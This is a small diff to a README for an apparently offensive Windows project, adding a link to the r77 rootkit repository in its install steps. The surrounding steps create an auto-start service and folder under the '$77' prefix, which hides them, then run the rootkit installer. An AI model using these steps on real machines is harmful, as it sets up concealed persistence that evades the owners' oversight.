@@ -9,7 +9,7 @@ This project is compatible with Win7, Win8, Win10, WS2012, and WS2016
 `sc create $77service binPath= "C:\$77folder\$77service.exe" start= auto`
 5. Start service </br>
 `sc start $77service`
-6. Install rootkit </br>
+6. Install [rootkit](https://github.com/bytecode77/r77-rootkit) </br>
 `Install.exe`
 ### Client
 1. [Install Scapy](https://scapy.readthedocs.io/en/latest/installation.html)
